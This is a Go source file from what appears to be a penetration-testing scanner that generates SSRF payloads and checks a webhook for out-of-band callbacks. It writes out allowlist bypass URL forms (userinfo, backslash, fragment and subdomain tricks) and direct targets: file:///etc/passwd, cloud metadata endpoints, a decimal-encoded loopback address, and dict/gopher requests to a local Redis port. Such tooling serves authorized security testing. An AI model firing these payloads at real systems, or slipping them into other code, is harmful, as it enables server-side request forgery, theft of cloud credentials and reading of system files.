package utils

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// Building the payload list, and asking the webhook afterwards whether anything arrived.
//
// The flow this section runs on:
//
//  1. REcollapse mutates the operator's webhook URL, which is what defeats a validation regex.
//     The framework adds its own bypass forms on top, because REcollapse mutates BYTES and the
//     forms that actually get past an allowlist are structural: userinfo, a second host after a
//     backslash, a decimal-encoded address, a redirect through the allowed host.
//  2. The scanner fires that list at every eligible attack vector.
//  3. The webhook results URL is read, and any token that appears in it names the vector whose
//     payload got out.
//
// The token is what makes step 3 attribution rather than a guess. Every payload carries a per-vector
// marker in its path, so "something called back" becomes "the X-Forwarded-Host on this vector called
// back", which is the difference between a finding and a rumour.

// vectorTokenPlaceholder is the literal REcollapse mutates around. It is replaced with a per-vector
// token before the payload list is handed to the scanner: REcollapse runs ONCE per scan and the
// scanner runs per vector, so the token cannot be baked in at generation time.
const vectorTokenPlaceholder = "RS0NTOKEN"

// vectorToken is the marker for one vector in one scan. Short, because it has to survive being put
// in a path, and unique across both, because two scans of the same vector must not be confused.
func vectorToken(scanID, vectorID string) string {
	clean := func(s string) string { return strings.ReplaceAll(s, "-", "") }
	scan, vector := clean(scanID), clean(vectorID)
	if len(scan) > 8 {
		scan = scan[:8]
	}
	if len(vector) > 8 {
		vector = vector[:8]
	}
	return "rs0n" + scan + vector
}

// FrameworkSSRFPayloads are the forms the framework contributes, on top of REcollapse's mutations.
//
// These are STRUCTURAL rather than byte-level, which is the half REcollapse does not cover. Each one
// is a shape that has got past a real allowlist: credentials before the host so a naive parser reads
// the wrong side of the @, a backslash that some parsers treat as a separator and others do not, an
// address written as a decimal integer, and the scheme-relative form that keeps the victim's own
// scheme. The last few need no webhook at all, because an SSRF that reads cloud metadata or a local
// file proves itself in the response and never calls anybody.
func FrameworkSSRFPayloads(webhookURL, allowedHost string) []string {
	parsed, err := url.Parse(webhookURL)
	if err != nil || parsed.Host == "" {
		return nil
	}
	host := parsed.Host
	path := parsed.Path
	if path == "" {
		path = "/"
	}

	payloads := []string{
		webhookURL,
		"http://" + host + path,
		"https://" + host + path,
		"//" + host + path,
		"/\\/" + host + path,
		"\\/\\/" + host + path,
		"http:/" + host + path,
		"https:/" + host + path,
		"http:\\\\" + host + path,
		// The userinfo trick: a parser that reads the host as everything before the @ sends the
		// request to the wrong place from the one that validated it.
		"http://" + host + path + "@" + host + path,
		// The fragment trick, same idea from the other end.
		"http://" + host + path + "#" + host,
		"http://" + host + path + "?" + host,
	}

	// Where an allowed host is known, the forms that abuse it are worth sending: they are what gets
	// past a validator that checks "does this contain our domain".
	if allowedHost != "" {
		payloads = append(payloads,
			"http://"+allowedHost+"@"+host+path,
			"http://"+host+path+"#"+allowedHost,
			"http://"+host+"."+allowedHost+path,
			"http://"+allowedHost+"."+host+path,
		)
	}

	// The ones that need no callback at all. An SSRF that returns the response proves itself, and
	// these are the targets worth asking for.
	payloads = append(payloads,
		"file:///etc/passwd",
		"file:///c:/windows/win.ini",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://100.100.100.200/latest/meta-data/",
		"http://127.0.0.1/",
		"http://127.0.0.1:22/",
		"http://[::1]/",
		// 127.0.0.1 as a single decimal integer, which many validators do not recognise as local.
		"http://2130706433/",
		"http://0177.0.0.1/",
		"dict://127.0.0.1:6379/info",
		"gopher://127.0.0.1:6379/_INFO",
	)
	return payloads
}

// WebhookHit is one interaction the results URL reported.
type WebhookHit struct {
	Token string
	Raw   string
}

// CheckWebhookResults reads the results URL and reports which tokens appear in it.
//
// Deliberately dumb about the format. webhook.site returns JSON, a self-hosted listener might return
// text, and a third might return HTML; what they all have in common is that the token appears
// somewhere in the body if the request arrived. Parsing a specific schema would work with one
// service and silently find nothing with the next.
func CheckWebhookResults(ctx context.Context, settings map[string]any, tokens map[string]string) (
	[]WebhookHit, error) {

	resultsURL := strings.TrimSpace(stringifySetting(settings["resultsWebhookURL"]))
	if resultsURL == "" {
		return nil, fmt.Errorf("no webhook results URL is configured")
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, resultsURL, nil)
	if err != nil {
		return nil, err
	}
	if header := strings.TrimSpace(stringifySetting(settings["resultsAuthHeader"])); header != "" {
		if name, value, ok := strings.Cut(header, ":"); ok {
			req.Header.Set(strings.TrimSpace(name), strings.TrimSpace(value))
		}
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Capped, because a busy webhook inbox can be very large and the whole body is only being
	// substring searched.
	body, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("the results URL answered %d, so it could not be read", resp.StatusCode)
	}

	text := string(body)
	var hits []WebhookHit
	for token, vectorID := range tokens {
		if strings.Contains(text, token) {
			hits = append(hits, WebhookHit{Token: token, Raw: vectorID})
		}
	}
	return hits, nil
}

// webhookSettleDelay is how long the scanner waits before reading the results URL.
//
// An out-of-band interaction is asynchronous by definition: the target makes its request after
// answering ours, and a queue or a retry can put seconds between the two. Reading immediately finds
// an empty inbox and reports no SSRF on a target that is about to call.
const webhookSettleDelay = 20 * time.Second
